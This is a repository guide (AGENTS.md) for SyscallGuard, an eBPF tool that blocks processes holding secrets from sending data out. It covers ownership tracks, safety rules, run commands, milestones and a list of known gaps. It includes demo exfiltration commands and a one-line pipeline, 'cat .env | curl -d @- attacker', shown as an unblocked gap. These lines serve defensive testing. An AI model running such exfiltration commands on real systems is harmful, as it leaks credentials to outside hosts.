# AGENTS.md

> **Claude Code users:** create a local `CLAUDE.md` containing the line `@AGENTS.md`. It's gitignored.

Rules for every AI coding agent (Claude Code, Codex, Cursor, Gemini CLI, Copilot) and every developer on this repo.

## The project in five lines

1. SyscallGuard stops AI agents (or any untrusted code) from sending secrets out over the network.
2. eBPF LSM hooks tag any process that opens a protected file (e.g. `.env`); children inherit the tag.
3. A tagged process may only connect/send to allowlisted CIDRs; anything else gets `EPERM` from the kernel.
4. `guard.py` (root, bcc) loads the hooks and prints JSON events; `bridge.py` broadcasts them over WebSocket.
5. An Electron dashboard shows tags, allows and blocks live.

Full design: [docs/PROJECT_BRIEF.md](docs/PROJECT_BRIEF.md). Interfaces: [ARCHITECTURE.md](ARCHITECTURE.md).

## Repo map

```
README.md, AGENTS.md, ARCHITECTURE.md
docs/                PROJECT_BRIEF.md, PRD.md, presentation/
policy/              policy.example.toml
guard/               guard.py, policy.py, events.py
guard/bpf/           sg_common.h, syscallguard.bpf.c
bridge/              bridge.py
dashboard/           Electron app: package.json, main.js, preload.js, renderer/
demo/                agent.py, internal_api.py, attacker.py, reset.sh, project/
tests/               test_policy.py (unprivileged), attack_matrix.py (root, VM)
scripts/             check_env.sh, lsm_smoke_test.py
```

## Tracks and ownership

| Track | Owns | Delivers |
|---|---|---|
| **K: Kernel enforcement** | `guard/bpf/` | Hooks A–E, maps, event emission, verifier-clean load |
| **G: Guard runtime & bridge** | `guard/*.py`, `bridge/`, `policy/`, `tests/test_policy.py` | Policy parsing, BPF load/attach via bcc, map population, ring-buffer decode → JSON, bridge with snapshot + `--fake` |
| **D: Demo kit & verification** | `demo/`, `scripts/`, `tests/attack_matrix.py`, `docs/presentation/demo-runbook.md` | Agent simulator, internal API, attacker, reset, env checks, attack matrix, VM networking, integration runs, VM snapshot |
| **U: Dashboard** | `dashboard/` | Electron app per ARCHITECTURE.md |
| **P: Presentation** | `docs/presentation/` (runbook co-owned with D), deck, poster | Talk track, judge Q&A upkeep, poster/standee, backup video (with D), rehearsal schedule |

Rules:

- **Before editing, know which track you are working in.** If unclear, ask.
- Do not edit another track's files, except to fix an obvious break. If you do, say so in the commit message (e.g. `fix(bridge): handle empty line [cross-track fix, owner G]`).
- Dependency order: K and G pair closely (G's loader is needed to test K's hooks). U and P are unblocked from day one via `bridge.py --fake`. D is unblocked from day one.

## Contracts are law

The four contracts in [ARCHITECTURE.md](ARCHITECTURE.md) are the interfaces between tracks:

1. Kernel structs and maps (`guard/bpf/sg_common.h`)
2. Policy file format
3. Guard CLI and JSON event schema
4. Bridge WebSocket protocol

Changing a contract means updating `ARCHITECTURE.md` **and** `guard/bpf/sg_common.h` (if affected) in the same commit, with a commit message starting `contract:`. Tell the other tracks.

## Safety rules

- Default `mode` is `audit`. Use `enforce` only inside the VM.
- Never run `guard.py` on a developer's host machine in enforce mode.
- `sudo` is only for `guard.py`, `lsm_smoke_test.py` and `attack_matrix.py`.
- Never commit real secrets. `demo/project/.env` holds obviously fake values only.
- `bridge/` and `dashboard/` must never import `bcc` or need root.
- `guard.py` writes **only** JSON lines to stdout. All logs go to stderr.

## How to run each component

```bash
# Environment checks (VM)
scripts/check_env.sh
sudo python3 scripts/lsm_smoke_test.py

# Guard + bridge (VM)
sudo python3 guard/guard.py -p policy/policy.toml [--mode audit|enforce] [--debug] \
  | python3 bridge/bridge.py --host 0.0.0.0 --port 8765

# Bridge without a kernel (any OS)
python3 bridge/bridge.py --fake --port 8765

# Dashboard (host)
cd dashboard && npm install && npm start                    # default ws://127.0.0.1:8765
SG_BRIDGE_URL=ws://<vm-ip>:8765 npm start
npm start -- --bridge=ws://<vm-ip>:8765 --kiosk

# Demo (VM, except attacker which runs on the host)
python3 demo/internal_api.py --port 8080
python3 demo/attacker.py --port 9999                        # host laptop
python3 demo/agent.py --env demo/project/.env --api http://127.0.0.1:8080/ingest \
  --target 192.168.122.1:9999 --exfil direct|curl|udp|b64|preconnect|ipv6|none [--step]
demo/reset.sh

# Tests
python3 -m unittest tests/test_policy.py                     # unprivileged, anywhere
sudo python3 tests/attack_matrix.py --target 192.168.122.1:9999   # VM only
```

## Milestones and acceptance

Run all privileged tests inside the VM. Department round is 22–24 Oct 2026. **Nothing new after 21 Oct.**

| ID | Owner | Target | Done when |
|---|---|---|---|
| M0 Env | D (everyone runs) | 18 Oct | `scripts/check_env.sh` all PASS; `sudo python3 scripts/lsm_smoke_test.py` exits 0 |
| M1 Tagging | K + G | 18–19 Oct | Guard starts in audit mode and prints `READY`; `cat demo/project/.env` → `TAG` event for `cat`; `sudo bpftool map dump name tagged` shows the entry |
| M2 Inheritance & cleanup | K | 19 Oct | `python3 -c "open('demo/project/.env').read(); import subprocess; subprocess.run(['sleep','1'])"` → `TAG` (python3) + `TAG_INHERIT` (sleep); after exit both get `UNTAG` and the map is empty of them |
| M3 Connect enforcement | K + G | 19 Oct | Enforce mode: tagged `agent.py --exfil direct` → `PermissionError` + `BLOCK`; its POST to 127.0.0.1:8080 succeeds with `ALLOW`; an untagged `python3 -c` connect to the attacker succeeds; audit mode → all succeed + `WOULD_BLOCK` |
| M4 Sendmsg | K | 20 Oct | `--exfil udp` and `--exfil preconnect` blocked with `BLOCK hook=sendmsg`; `--exfil ipv6` blocked |
| M5 Live dashboard | G + U | fake: 19 Oct, real: 20 Oct | Electron shows `SNAPSHOT` state on connect; `BLOCK` turns the banner red within 1 s; restarting Electron mid-run recovers state |
| M6 Attack matrix | D | 20 Oct | `sudo python3 tests/attack_matrix.py --target 192.168.122.1:9999` passes every "Blocked" row, plus the untagged-allowed and allowlisted-allowed controls; checks `EPERM` specifically (not just "failed"); attacker log shows 0 bytes |
| M7 Freeze | all, P leads | 21 Oct | VM snapshot saved; backup video recorded; runbook complete; 3 consecutive cold runs pass |
| S1 Stretch | K | after M7 | `socket_create` denies `AF_PACKET`/`SOCK_RAW` for tagged processes |
| S2 Stretch (finale, 26–30 Oct) | K + G | after the department round | `file_permission` hook: a tagged process writing to a pipe/file taints that inode; reading a tainted inode tags the reader. `cat .env \| curl ...` becomes blocked |

When a milestone passes, the owning track commits with the milestone ID in the message, e.g. `feat(kernel): M3 connect enforcement`.

## eBPF / bcc debugging tips

- `bpf_trace_printk` + `sudo cat /sys/kernel/debug/tracing/trace_pipe` is the quickest debug loop.
- The verifier log appears on load failure; the cause is usually in the last ~20 lines.
- Common verifier fixes: null-check every map lookup; use bounded loops only; keep the stack under 512 bytes; read kernel pointers with `bpf_probe_read_kernel`.
- `sudo bpftool prog list | grep -i lsm`, `sudo bpftool map dump name tagged` to inspect live state.
- If `kernel-devel` doesn't match `uname -r`, bcc fails confusingly. Fix the package first.
- Kill `guard.py` to detach everything instantly.

## Git workflow

- Branches: `track/kernel`, `track/guard`, `track/dashboard`, `track/demo`, `track/presentation`.
- Small commits. Conventional prefixes: `feat:`, `fix:`, `docs:`, `test:`, `chore:`, `contract:`.
- Merge to `main` only when that track's milestone acceptance passes.
- Never force-push `main`.

## Out of scope

**Do not expand scope without the user asking.**

Non-goals: packet/content inspection, byte-level provenance (except stretch S2), hostname allowlists, Windows/macOS guard, IDE integration, packaging/installers, multi-machine management.

Known gaps. Do NOT claim to block these, and do NOT silently try to fix them outside the stretch milestones:

- Sibling pipelines: `cat .env | curl -d @- attacker`
- Writing the secret to a file that another, untagged process sends later
- Exfil to an allowlisted destination
- DNS tunnelling through the allowed local resolver
- `AF_UNIX` / local IPC relays
- `ptrace` into untagged processes
- Root attackers
- A process whose thread-group leader exits while worker threads keep running (tag removed early)
